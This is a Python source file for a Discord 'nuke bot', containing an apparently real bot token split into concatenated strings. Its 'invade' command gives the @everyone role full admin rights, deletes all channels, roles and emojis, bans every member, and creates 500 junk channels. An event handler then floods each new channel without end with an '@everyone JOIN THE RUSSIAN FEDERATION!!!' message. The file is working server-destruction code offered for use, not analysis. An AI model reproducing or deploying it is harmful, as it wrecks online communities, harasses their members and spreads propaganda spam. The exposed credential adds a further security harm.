import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio

token = "ODc1MjQ0NzI5MjU4OTAxNTA0" + ".YRStLA." + "zwICTvd8rClnz8My9MbIYQxtlk4"


SPAM_CHANNEL =  ["YRW8d3zi7u1mQOwAWyXnHtGHUaZzY0yE","1LL0yoVo9KaVGmui13NUePeKABugpcEg","31svtm93shrhxmTi3Dc6gptsShyAu5X8","Yf2ttm9QJiDxJmuFl9TSqwj7ih3zHfCa","qYjZLmPuWhN8TBgoD9gsPXX35ZeAHF5O","wR99j96HQn7PXG9vFNp1vinR4CEIdc7I","2azQi1UBaCXv5tGWyMxT8LKPfy8GWvyj","4UWtXEbUsF6ANfKxEWnKKg9NQXSOjQjt","aIaRAKXkVOiABwndg6ztTOmWRk7EZD8N","7CM9gRStXHjQzuwfitFIr4UnAjrRXvLu","FWX3HtOKjWiMRs47u8exhgWXJIpM8aa1","LvaccsvscMQJOB2VlzTalYS7XCIMKC5Z","CbU2PJMgo00OKl32Yx06JLn66WqtxdsM","1pyZsJDcxNXx6rsOcVqYBK6og91NJx70","4GJ8EO8ommIFAoqMXY1jBa2ZBe1aZ3ox","zFG9kif9iQRmjo9P57DejM95WmjeU52s","lwayRe8UT8gT8clrxYnKXqPEKi53TFcr","8fU6JGwNqs8nHa4lSRYTvULbnNVIf2Co","29mi4UVUf32ii5CfX3ymer1H8c56NYTS","9bs1va9y3Xq4aAi9Pi0LwQRtJF7HTYDx","ctssniMGDadM7pv1Y8Ij7DBIFCoRdLZG","N87d6Dog75xVvLUja7Ey4c8l6veS4X0u","qtrh2GCRiBzouN2D571FeRfS0ZcvD08r","OpglwhonsIt20AeOVFrwM0876N0GEtBl","M3OMY8Jcm8pgH46b7Sv0HzcFhsTzTGam","34PJpFnjEf3BZShb1mR7y3zwFEexKUbB","TTPGduYAbw4MDIyWe53wend8AyC6cBeR","AeMQiNtI8o8xt0TbQdF9ppJcCS5W1UkC","QNuyTcB0FP3RYST1z1ZiwUvlHSYWKKlo","1Ck7dceNjfNWv5ZIrkTkJl8mccpkd0S9","icr7qXd09LxxFCiBu59Fy5nZm9LPBGdU","uKKe9vzFeWO5sixSdnp4A5gu1fB8YYOh","594IOEnCiyNSR0K86Ches53C8fbiJxxr","oxMxpKaYv2Qu6mWw4avWDj5WEUyHMAOK","0Dbl1UjlWIZTUfRMFohSGhcsjYzyXJkC","5UBRrCNbp5ZO4kpFpi6WSWUDz9fvkTrQ","pZoDkxJZFAP40W9qlrcUBLMGrFPrsvtg","9nSmPjLfmGme6qSW0Jfwy5gjZwXybTvl","ege33PJU7mpJtoVaeKtCCNmV7RQQt4Z5","oLecwEoHGZIoTRisyte3yFhBGPhM4i9K","z6HvEhp7FDb8JQiCx8HF5M1bZSAQC2Ey","RkwtOPSyH4VPWZLOh3XtyhXAmJsi9KcV","nmmOXGDmHfMRHc5HqEblI7rW6iATOEhW","r0yoerg1esOb37fDCaokKWE2KCR0Scz4","iucTtBNXhiWDFShI2M4rjLblo9hyYeNS","Cufgm0MeRMG5ChBtupij4RhtfBAcnjmi","2rRkCWLfQUdcLwurpMh3UlaKEuJn8jUj","2ZhpP6bdbiHcyEtbA3DQ4wagt0SfRzUz","ZJDflQLFaSuMZk7lllY2b1mZw9hL638T","d8pgs6Kj6fl98MxkTAFzlkiIpKhochdz","MUx9D3f0uDYU4XjpYKzuWq22E4SxQQzF","lch0XimFn37DfbFllV5RmQxL4AHY0IZz","Tyrk1KRHOAqM70K7ysxKOZ1D1Qq36JzD","iXWP6FpHzmjpky1iNxYqLaLrd3Dm57gb","CH3yGCRuqfkhTlZReWGpPQg5oXnk7v3R","CyOou5LEFNESUFnHHGL5tpmAxTEPiQ5R","npx9B29lUWEuDgJqxugxnSbPaJPmmbJS","qGoLA8PrYIzCNDTcD9GOUIgxUmUIrezG","T9WHpsDGqQVbexSxnRrZXxu4asAlpbLE","DqtCmmiJI9CsNZHlCpkA7mbluZqVJhS9","D9lySWlAPHNEl4CX2cC1kHNhDMZaMM0z","KHzeB8hc5SCIBxA52wjSgjNXl9datjWc","V1HOSyo6zt7ul1KowIcmcYDEY7fkE2ol","g3puxRGnljRSLpvobZ8G6ZzqBJuWZTV5","uB0zeiLvCQeSjOp2Pr8iCNDo7wlRZRAb","mK4m7i8lkrd16y0zuBTQ9byx3j9FCJTy","FBRH93JJ1L53IQkw2iPUWwymxsujeMex","l1clr1LOjal8IUWVDNYS4xQDkdROBmPS","RZUlz8M7VBTyrEEffNaPpoDucVpY0BIO","k0IA1GzMSeqs6j5KLH05Zc6M9PWYMS8o","jAVzA3AbcKhTxJoOEcb9dnNnFTxTPh5P","5VheODYtXVdu4BDEUuUPCyHaTrJvUiUu","NombcAdKCVxQXTIVjgUr4OhmznEvoPpi","0T8t3fdAuNMEH1MXxhxJUhelTUIwGYb9","yIkFiNgINazc1hZzSBbnPSCJ7npeKsHX","P6H3mRdCxMYqmO2J2SHKqHCDywYnM0Qq","JsZC2strmJYvVUkDuGmNTAxhOQ2aVSjK","EFwX2E23VXUI5qsyr67U3QngMbMQCJIV","GaX5iTOxoLeQVqf45Y1bC9CNMwXMe1zX","ySftLPXanJKQDwHUJS7Ndo92lCeRF7OP","qDDGe85ZGZKFOclEccsKpL25Hy7rXxva","Tj6eaSSXqpnx2d0R9MzALmijesYvbbvE","DHEJ3U0FkarCDabFuZeWLXeu5kf2lq5e","uiEzWeFlGBLt4PzwmmydpiyGwRje0Tb9","qcfJcrSizuCfkTmOJVzXzrFpeOdeGByT","j0B6qI1AQCwCEaAiTCGoOqE5hPfUs89t","koiaVXQtpjAk6BWt4K1LfHP03Ns6Qejo","1xW0GTXogepceLYgo7UUaGt0x5UTOrSZ","SGQVGUrngdq8YBJInjShvZu3SEynbPBT","XaEg0qxYyHQJdloOKeT2LoGNQ0gmJucZ","M1jLefhQRnw9aazhZJG7JWATNgSqA0y6","LEkHfSfoTQxPWCowIaXGFZeJM1sj3q10","0G4kmcd0HxXugzIYGwPzFLZcgG44jXcS","oHqycJieN8cRHOSXTxIokxhpyFj3wlau","NVB1t1UPQK3b28NNcBAGJuuFbqvCZVGs","4sxTWyC09y9rQEIsK8GwydQUrzUntNnr","Hx02LyJF40YVl5YXQupPN3OO8m8vZVyq","j9SrlwlcLcg262qJualHaFx4oSjxzSRQ","mxrUKcG9uQ7xxS7wgdTMHsn1tsVZ6Sie","SXThyLp4hShSqKNnKOGc7i28NPQrsa13","RvhnRXalIHR2WTrUVZVejsluraTiZtuq","8OXYg8xTZn9pMBSlpFiGuFegSHO0cJtz","oQRBVcf0ZY09vMsiYJHmN6CV82ylrzHq","j0EM2inRhclGFk42TxxZ6cjhJgJcvBdy","28LW9tki2WIuoRkVwtFUs8DYnAMxxrCr","4acN7I6LV0jUBsp0Oo1cFLeuBzwVnfni","EYFBguBaGx1h5oaUd6ciEeSQqUZko5Wl","EBrek7Pjel1FLHgIl9FdvwPBx2v5MgKy","0mQWcDrxNzD6NTyEt1MtQppIveWKzuM0","cpZoiMmlPj6gOUAGss2Jp5ja0UQlvG3s","B47Rp1bWcybPkJUqft8wD5Oz26xC0qvb","QQNPlKUOlllfPY2Az1h73t1hmO94kFeU","FiquUIfRycFDmcbypfrnlYouhWaziIUk","AXnnZeokPXwLu8nM6s7mCSoGhWfFvVta","kqslV3mwKjI3ntyexsgCkp8QqwzwY7G6","Jf8zYMYLjN2NFVXU5MOqBPBj3fjtu0SH","qb5bpJvtGKmgzsmJbp0RGvrpHy1FmI6x","9TPvnvgEPfeTy6KA4gcliD6FHGQSXyXe","ScZZ2m7PV0q2gA5Kfw5p23bA7B6uoZ67","lBzYI8r9dzqvTQyiHhLq3g48ULXiGvyM","sUKp7AXds2cjjc7cv33aFtHExpunOlmk","HJYTW6RytFi4SFoqFO5EJLrP4YuJAIh3","tt9sTOY91ujOYhWPY4nx9pLDdH1HlSIw","e2Bsee4YF78LIzcHzJ5snW8TPfY5pzUt","f59MKmsuMhiKcObU4ryp6EQlbRkC5FjQ","5bTlyZe7UCrzcvunUItt3TUfuZ5Es13q","p7UWyLpbdrpNupCclJF3GLUemnLcdO4w","np50LP0sU26AwHfzuXiolC3A69RdidIx","8tjEXBOL6xNu100N3rOoEO3vZgESuEIR","NK65ipihQ1H2HigTNzsCNISJSh8KLd0Y","rdEBjbnzkR4Oq0AwEOM2GcWpe6UEs0ZR","FJqSPZtWzcKGlCyZeWCmTwsLF2rBEK8l","BTNDkzI0Rt8ccg3BUOqeSxuc62sFwGGC","z5cZ3dcbNBloESfrVOASqgeMEmUbEZLN","2fHVsmFzY06to5T710jILWYmaXvZKP7v","jsaeelB1ElizqVPJWuuqm78bvXZWFO6F","NGOwjJdkIVUqvYTlg3Ayt1VKPnmYj7rj","vtjvonPlhMNDgAVXSg53KZmQfkRLm1E1","L28Y0KdWjaoZmTFReQgEKOskykad5YTY","5e3kqjjZ37TMf9uVdLabX7NUx4ZM8sFu","fjeG9TSBfNKY7OCMl8K2sINybCEvEFDN","bTYh0gSffZPCPBqYHv6jo4PiKmZxvQ7S","7UZvP4de4xcr7Mkbq09W6SiHKFwHEpCY","bhYl2M6PA11WfqpIl2W1a0h2foxlRDx9","NIV15qrtIqS2z5GfuvZLQESLn06LtXB3","d8BJZhyOFDSwwo1dgSNfj0dTRGowddFV","oyLvwWdHBXxW3axWLCjd8bMltPZSichZ","Rt5n2iqdTX5dl24VRWicM9OjLcbxQwo9","PHRs64RjmEgjz4Ymtbd5ex0wBk5U2BLV","nNEtNIWk1pX2P0Ulx8HzhiQ1u2nhxDUp","frrjuCRLjoy3SL0qh1Cs020iRSDMW6tL","gSJFeIcI8Nhi5rnF4OXRKFgAAviX0hSb","g3FTmXLg1kiV7pgxLdXnTCy170W6FJm8","RcA5Kb7UR4FzDvj2tutobBl2p0vZ7E57","B0t8Mx3QsbVA5tirtFM1yW4ASI8lRSRA","TCBzowe7lMKv4Sc5EPvukX0hlgMqpIgm","PbRgjKCPhoCyCuxRxKVAbskr46EoSuj7","DUN76hqzsq02bpX18IJOKHPquER9HNmv","SVuwZGGynantyyjQt1JW2eT2eM1H1gC5","bwoDKLudiXK8HSpNG2W2veXH78Yfu28M","LGyaVbmQfYr9lsZPg6L5j5bDLfslP06f","37FqKm6WQxI0iJEq6A26vLCY9H2KYPKm","6uz3RGvim7OeZwjgaoilrVkFxdu9zAql","Oec4VmzKkabq7I3CFacNwAu5EpAP70c9","KltjidpIt7dVsbb9TFLgkNPtmbRXuOdM","XQBbVEvpDdwsriMrlUMxwVV26AFkDBlW","TetEdFaFNqqPIWRtWuPkKsLS3TUWM08M","alhBHQ9ZcUjizY7kHx3eINswVtNZ3Aon","33GHxZ6z7KdoocPLumDDWtUr0WvzzcGe","J1rmotl7Kc8QbjEnyU0iYGmHBU9gD70e","bFD7VWfWdCcKrM5XIKCxzkD5ovqX8RiF","yxDjlYXf9JwvAsFkHuVDmSEiFZC9C9kk","HhDBIT2C6iRhoWvhazyzu5Mu76cB04Ev","RaMbzKEejFCOg4o201IYcB2aW3b7uwSm","E2UIeV3exwLq85RRkR26UiNgr4VsXlV6","jFDYpWVO44r54uk6CRWFK3v09L0vDdHC","OyAQ5nVv1JYXOxF6Pl4xVAxEWySIwmlH","wUGOx6ksN8k9roO5bIDTTszT8N6HbaO3","pqUcTkfjmRXIcNyiX0X7fsCdP36t80ZJ","wCZRF45q3KR085CX68Vehb71UcCcYvuS","nQOtQs5djLLPL5D4Rm4Se0tLyoP3ra2F","O45uhoneOMHep6zkeluj65H4Gm6WOTTW","Vrpk9ry12pzpCnD85iYQtaTzWDowr61a","VDycCjVKxtiJIMxoi3GX6pzoaHf02ICy","8u2OunQQFkbeDvbYJMMCu4QDkKnFuu9M","cF0kdF4g8PcYWOPi239XDv2uzxzEDkLI","vkG5A0P3zJhrzslaeMaU3Z7CozS3wTNC","DC1iklzbbg4SXuTj5GSXE1o2VV6crRkL","YJnPvW8V1uVUqiOcxZJUqok5HyvtWlG6","c8oLLRvsQKO1VFgA8wJDVuSSth3nxP3e","C1Zje3lQLXf5FcenGXm5rRk1bvQmxhJ8","3AKwKdyB6oqoxuSKiudJhBTZRYJRIon7","7Dot2DzOLeXmYkx481uA6ZpvzAUF02bp","U70C4SuLotC6ueoa8BPUjPY3lFBYjgo6","anDGCF4xDrNiXW1WamKJjbU9GlnaEzwp","NZ0hOpPMjKmx9YLF7gXvuijp95KZiYeD","2KVmDjwlU8MuVGMJnhb0bEuJMkkQEN1W","t96TSkflraZP7sA6rW6WsksHdEE6vv0q","Z4K7txWUNqxgCniPdIQJK1jmWWrli6pF","FYVxSeUvy9I1RCt6nSSdz43sneFIyAvl","5oSIDBRjBo6z7GZ7hNhm81t0ZDwH479O","SaWH4cmf8qxucoYMKyGvZyBaPMnXvqci","JAOr0aoqWU0sNRjh4iKQ4xQJTK4lhb2a","nvRQ8AKJg1aRsHhXHbKGJG4pJrgETDUE","p9eHi7QSvVXahSpQ5VcXTmYOAry7oQQg","ak4lIUHwMeLLZA3OdjpgwIfOL9lJvFGq","tUKmiYvRzfPLQG8Y3tp6utaexjYhH2qq","GIYVDfQ9KQbTbdfSvTVvxXpzLbgMFoyW","bHFQpiKCWvPAnyh1zXPLynA8Ltmq5WJ0","omleIB6jfEig4nsSZHzyiewbalIexjm6","yuqZRbwbl8t3PNS74Z2zffevMk7qsZpJ","BsaU17UlbhQY7fQCuS8QOQccsAVrJ9fT","pz6CH7Ug2WUNYM7JnDyNJzI5SN9Pg1Ov","A2KfVbDHrUgfCO9pCEl4wTDzxBmxI0Rq","R5xm6iWLATtNBL30KaBCpuo5Dyy0PnHf","Oyy7aO81TTGb2LhwdBEko2fpJwdqEKOf","ISYKKWA6i01ZkinMmCqNoI8PG0sooW7E","N8CwSvrMTf2De2DYOiriZSU2Ad3pPsNn","mEP2QF9bh0tLvnRxKDWl1DR10Pm7PqDe","7VQQoVuovewlZ9bDy8SZ4Y9cOCqyckYW","N9jB5C8EZv0pKdsH9sJ7MwWL1hdItfCP","nCf6GSs7cQgcxykGf7drHYbcZ9UQ2mY2","hdpd1AD44baw53SnYAytji2xFEpBUEys","HLCTbva3of2mKOrJrpPZsRQNNk2W2MRQ","68Gd0naTLXe9QGE1Zu0xY4x2Mha6dYgc","qO0vVL0fOByNA8Ei2lZpJJuccfPeGgSf","X8vgxQOJ5WzhWnD3IoeJ83p4uMxeQADu","4dx8LpZMqdbcqZeuVOukEI2NniVK9enU","U8glzjPOfcbN2OkU9D21nrEHhWLuypu6","e5oWJA5nZCrx8X5k5AzhgoVx8DlWDhp9","lJUsRSfeqNOZQXMZ7XDqKoP7v0bF6mDG","rdNRre1Ro2eHT8R16wbTtLQbDwfP9FiX","DpP5FMOPsO132HDj0i85nwdMkfEKpKYX","tyIvdGahXPaha6SplzCW5LvRdyksI3IJ","z90EPLBUeAjhIMnjftaf7UPhln9PKd4s","nTj7OnztiwuvigArJGOzDHAzdvMHNG5G","3JDRQ5vPSw4aKPzw1Itq6WACkLcoHdEh","7jiGTNcd4NV5s13ar0QI4JjkQQdKkPRo","NZgFZ8lXKIK2umWXHqQvLl7GaUP3hCLp","m7tZDer7Q3esF4Cn8lMmAUjbzM20EpH0","M8OfrCqAmVH5rBgrWcnD1hLghdviFjI8","kBv7tGRT9C7srwproyj2wYjq6a5MqzEB","nvrZFnpnmdnx7N7LAyzaAjcGr1LOTLoH","yu9VqpX3q81gtibeI1cpYRXGy1HrbFXZ","6i4ZxdKcs6IlX2x2B1RS46MSpvLGTq4N","duCaq4K6hMlIf0pqMk7jsbfx0uhsKdc1","BUd5fwtWKvRvdo2D12epicspKSYpHEmr","nYvkha1M9y9deKA2l2ajabs2qJok2yhB","la2vMNROXdq3yat99Hm1K1m5hkA9OFDO","HUTeTvAcZpITckVYzM8vsgXKhOPagW4v","6BftcCA6NxSJW7G9lpBDxGL393SJmN2i","tDn9LxAexXsiSCu0oHA4Ops8DcFJCNyy","rSG3ECB3wQCGS3jDDCVZFqZXFiXs1NDA","ezXNAbW2jCYsqmpggY76y1GdBJB5VHcs","iwn5mhtBu7ZoI4dT0lAY7ouWY7RkhQAK","EiyL460MOpurRkj2YZTZgeP121R7XFbE","yzbYNE1idCtHh553k5alIufv03pQlM2l","FMMeah0XX0d46ZCdYEjHvBBH68vQrFhL","EfpYc0Ct7fSd6bIlHyfy0rJG2WjIWzsP","taQpsnAYSdqQmZzwpjxAGU6UYdeohYRL","empSogtw5pYFpWUt8r2UsygdJ8iaOMgg","ZLm6HJb3tHWmcJrEg4gfIbroYirtSKtp","4dEJPONFWq12Da4QsX8oTlYoeFX08Nwp","eojnhfbIYb2NUo7E1Qt8YSkE9mijTp7p","kyEyFO1PwzZinO9znFP8agQUcKDAV6TG","1IZtB3HjG8UTfQXMV901omaU4GZ1y1dj","5PaK2KAcI7hpig2Iynf43jXgcEOtrrU7","nubDIDhkYo3mmzF8Q06jOYxy7Nb0JdaS","yIcQc6UeIpqBFRWtSieopces91j07ay4","6xZiX83Ne6qOMTWqlZ5NWMQrutgM0uAF","QkZojcUwxqLOiwPVI6UcbCZ8SQw0OSZw","mVKVmzjRbqJhBTGorM5hzDDACap8xdvE","MlZxZIAjnqMPAG4E2o9KFLyuQ1J56TDp","FLt9tvbLu8WxnHg3o5i6fvHBgVJ9inko","j4pTSuNM10CCQDNnPnTRRs2PiPEqEyla","81WidPgs8fjhmtpU3z99yHf1m0RgoFrr","M3xz4hZ2iRzIXAc0jxCtyVscNXip2oML","ihSfyHCWSmTjm62jvdrTqBxy2KIq0QIt","8Yqt8Z0Y8EwSfuQw9OBzKcab8FOvoVOz","XjyRb1KbtwPmZXYjZzHKNemUUxrFUcUL","Kz0KtQpnjloknrA0OZOQQ07HXhMapBSr","yBZXDhaBZWM6hg3XHUFCD91cteheLo0z","ASi2XjsZhF5zocqCrP0fStdIsrddh9PF","mWp1m6ZyihItjeUGm0xaUevdpRBuOzJZ","bV9y99g4WBcEqJAz7eTUd1pmW2JKUKqS","nD5LWFB66KlshBOV8K2Ek6JBcXw4TU2M","JEB0Q6anGMoRjHfQ08nWkRrn9Yr06vQz","6RdNgRwDFDGrHjg49eb7U6EIfNLDe4eb","3y8eapoaFKgIixup3pqsVzwRFcagKbuw","yv1SD3jR9chzM1ETAfPlOYa9PcXjj7Zp","2sKgVofFeHAPvChIT1pnNKXXBk5uJeRI","K90jDkymCkT0aALSKa3C3XOGjRNJ0d9x","zSYclj3UmbG6D9dkXQG479xWu0BBXue6","A1NbXqaoSNFkWcBFdewxpC0poCcg27po","GFZoD0q2OTY34kTkxwksxUXrYS00Lodh","Il8NCxnjJephvbmygAuSgtMABRb8PScN","AM0AMPAI5qOvHnKSyNEN6XbJLsS1Kioj","ugRP9rav4CDgEFh0WdZHQ1tTgAB5EXKe","9GPs21eMlobND32vJLPjhAPWoS3pJYnp","so3j2ZtIrWJikYLoGFMd1cUpX25z4vGz","a2gJweQ04Hfi1FKLbM6FQjEhuJQQMAQr","tQUeucpgVPl5W51EkX9HlV8dzQizoP6d","ge5IuaunSlCLroFQYwPGbKXjOVwZUzU5","X5MeeUJzW60iJCnLnz37teQlWlbWOLt2","cSxyR6sHNBJFm68I3lSqhU7lOwMGT0qH","tDBBLM45JcLyUS2FurgvYyIItv4y4tac","ZUfTsT3E0fn7XOFNKAi6yGniBiin3kXK","jQ1j7GGWMn6HVEwzyhnTcGUvIeFyJrYE","PrS1vup4c6kKjqdEKs9IyHsBAqPzjVuU","MjlAMNA5yUsbYvddGsfAe9tCV7qJUT6Q","MUoX9bj0vPsw4RbFhl59eJSP2cspJUzX","otWyIxqQYL73s5hav9IkEMUUM2PvHJ7Y","HDIVuSu7OomLEmiCtLxzJMUjVXcYwoVc","WPv832coIZEL8IhlJDhzqYHRh8sXvoeI","VxYf4mSUy7HApadO4W1GzPBtHfsx5FQH","QMgxNrZCSpP0ZQ1uRLPH8ldujhGP1dcd","xXsZ9etsbJ8bgWTkwyyI91vLcRUi1vKC","tMGF2gSsPG5dtZBtKXy5u325fLVbxwBm","DWFfNyk94zXho07jBNFh1sLzk9kt55rU","R0KxSLJsf9mSocEfcISh3qozjS36TCXf","d2AuODe0msQKPMICovVl3Gu0omITS7ce","UO71A906BtFYXdcn5zU455iOkeNnUpj3","uMSPsUAuOI7zXvCLi9wvmOuoLxACGWuu","qB5789ppbVNTUeINhRNug01zZBiRwVLX","Phn97Y4pL5IGIu3mhNa599CzWV9bs1Rg","K8KGRt7cZeDrEvrunnOYKAHt4SUIHFs2","ZRwHue5d6vVDPsUMhJhXj76O8fn5lcWl","WIJy8sRPejrt2OpNMx3FrziFC5C6gERK","A518vsrt8DaBtLnDbC6ftAfgCAQDmvzz","ZiCG5renyc2ANWpcYSNRHYiigL28HDub","xBUuiVb6SWXiG5J1NdBXIdRELg2I0RC3","cdLX8HnnM6HVjttBHp8oZeAe64nIwOC5","k8WJqwmhZmY3mwwQZdJjUPgq5qoKWv6l","uMi3xnGq286Kmqw9JV70qCeuDpE2ZGPk","fl3NZqg7swIJWBush2Q4pu65AFnu8KUI","QEbx7iMdakUsEC2TQOZ5joM7yvxNulWF","gyRn5hUlAdiitgb8kGIcL2BwkW8OBusQ","WK2ZK13oWrDppLc3m4hEylEVibiCIPjV","CXb3Zf42mJV9pU6Nie4SZN33J3PyW91D","1g7OB5269ZOiLj82YXCXZROWNfEVOq4Z","YH5uaddbW07ybKfb2zPu3U74IOzNRsMm","UnFI43AsSJVZB6qGt4zPwxhdHeBP4smX","w7pmBQdoa8vgFAKQMhyQNSXTcFIDKu1x","kWhE55LC0vMSZtk8Ig8vMhAuNwY81Iw3","mjlMSDsTo2SllXSdVDNk0USLOhnQ6LaW","xhfBsvpRdZ5KBYxiVQKpVZE7Y6z3qC1m","hnFWKvPmyHaGLPkssSJBlcklyKXCh2Jk","ojTzmvImFak5E6En72QM25yehOpZkoMa","bcTkciQqH3C73jd4kKrLGicd9xhwllA4","f93hwBdW1pnqzDWlhBw7LQuQD2W3w1xg","DxmAM7c4rvHxHj6toHEwcTvppWnm6sEV","p80SvhrWd2pDJGZmf5gydfVuxVPaUh2w","6CjTmtdff0F1uYtUqD8Lb1yBZ5saDPRL","UzYe5Uf0JbMoTE4175Q6SrnyVG8Yjcig","i6B0bAJ7iFuof15iyiv4mmz9sylbZYcy","i2EaBGX2vz5ZzP1BdpIN2BtnkimS5SVd","nfcIYTkSEsqeOl5SfXPnLKPFQKfPdoWa","sdgZnTEKlBRYHU5SC2ORn4VBIi0sqiQU","1iZNfrOHLAtspUNfrktvJAtrHFDzbHwh","MLDfBIrzD6juX489hPK61AC3exmaWYJs","qcBsegzPLiPQq5Q8SgThBYNVIEbWrQyy","uLvfSKXu8fyxKZ9ATKF9XxiLsV57Dzha","YPvTyoOqrFvu0EqgN5WklAyopNAjwcwR","MlQ6K96a59gJ8X8g3ZR6T2hbgTaraeRC","cfVbnq8xNfYR76jvRCSRrOgB8wtWmhPC","ZP1wjzOI8DsiQkCUbICZ7XUewQ6TgCNu","5WXpxlq8cc73uHWQgAJJgd0o9YPONhLm","fgb8gCsWPgvoOdGCATPHRLU05BNGf4ZP","AbVVJos5rYC3hMJo1htNwlx1xnqFxPi3","NmGGvjDGzVZOEC6xYEF5EiBNxUvl2TLK","1fuSTrvjGrABqGwfPdFkK7CDPA8qJVMx","J340jZDuKHnmlbqVqt2dhmp8dCX4qOn1","u8sBLwvfSdE34MsBKtuPtH1yCtjhjdOp","FC1Jj6vwjMYWUEEpBfIn7CoKRKK8EyOd","zfxfnJr0oFTXPmxWRGjN8ZBMmZ45YXeT","vwtpmQmCTEf2sZYYZ3zxlC6HzMWsI2qm","PyssgHMdO1ez5xBp51FLrlIHWRnQQdhP","i2ngDKh73oT3zy5fZMcTQ4fXN7NVnVbR","5PVK6OdhsSaZENwPwlMZ2vV1trlS87se","j3cZ0H5ztuiFRKbMI9nM8NcydVw6RwTd","UYKHv5kou7UmPaGKaVTtv6OseuXTx5Fi","Kg7rqlFRHb1OnkAjV4ga35VScLm4Dobw","He69AJ1qorfiNcMcdZyz5SMXopCPOymi","AhA0VNd1arfuy7YcZOZU9CtF2moe9474","KNqPK3sQW2uiardwm4Eos4jGH0gouNd4","48qfOMrbW50ZWsPx751rDjhZ1budy2nA","5fCClxEcNw7lM9NJO2hSFHciPBE2gFfx","bHSbdFyLda4ZzWTh5ZGB3IaPOFSOe5oT","sM7gz9WPXKKopV4u8fKrfhElJYTzNIv9","1AtztAl8XNI4A3YpYs29rFGxUhdZ06Xk","P7py6Kn3H26I2zP9cDOYf4LizxsfT5po","IUGgM4NKqEKms1TKDNenVwBiJ8YUFnAG","1kTHWqJlWSy4iUBhJ5edOY07zpbtFYEI","5liIMij3xhlyfVHnUAjmlLEmeYMIsCCR","5hmn0TApVl6pFHxgrIdliiq65Wfrmb9j","ZAhiBlU2rKHZLUaA8YYLQ6Xhtvgk00EK","bnM52rPate8QzITAyldiv3v2xodz1NKP","cwPhDHF6AbhP5NhmGm9Hd5QsDOjAddEH","DL9VLuzh2V9ouF1NiL6hLqvLpF9nmLoI","xxZQeCeZrIHrfmgdggZYpn3cZr5acNBo"]
SPAM_MESSAGE = ["@everyone JOIN THE RUSSIAN FEDERATION!!!"]

client = commands.Bot(command_prefix="x.")


@client.event
async def on_ready():
   print(''' 
   
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝ 
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░ 
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░ 
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░  
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░ 
 ''')
   await client.change_presence(activity=discord.Game(name="dnd"))

@client.command()
@commands.is_owner()
async def resh1(ctx):
    await ctx.bot.logout()
    print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

@client.command()
async def invade(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban("⛧ẻ̵͠ẏ̴͐e̸͂͆⛧")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel("NUKED BITCH")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

client.run(token, bot=True)
